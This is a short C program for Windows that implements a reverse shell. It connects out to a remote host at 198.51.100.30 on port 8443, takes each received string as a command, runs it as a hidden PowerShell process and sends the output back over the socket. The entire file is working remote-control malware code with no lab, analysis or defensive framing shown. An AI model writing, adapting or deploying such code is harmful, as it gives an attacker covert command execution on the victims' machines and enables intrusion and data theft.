#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

static void exec_task(SOCKET cli, const char *task) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE r_pipe, w_pipe;
    if (!CreatePipe(&r_pipe, &w_pipe, &sa, 0)) return;
    SetHandleInformation(r_pipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = w_pipe;
    si.hStdError = w_pipe;

    wchar_t cmdline[1024];
    swprintf(cmdline, 1024, L"powershell.exe -NoP -NonI -Command \"%hs\"", task);
    BOOL ok = CreateProcessW(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(w_pipe);
    if (ok) {
        char chunk[2048];
        DWORD got = 0;
        while (ReadFile(r_pipe, chunk, sizeof(chunk), &got, NULL) && got > 0) {
            send(cli, chunk, (int)got, 0);
        }
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(r_pipe);
}

int main(void) {
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);
    SOCKET cli = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(8443);
    sa.sin_addr.s_addr = inet_addr("198.51.100.30");
    if (connect(cli, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        char req[512];
        int n;
        while ((n = recv(cli, req, sizeof(req) - 1, 0)) > 0) {
            req[n] = '\0';
            exec_task(cli, req);
        }
    }
    closesocket(cli);
    return 0;
}
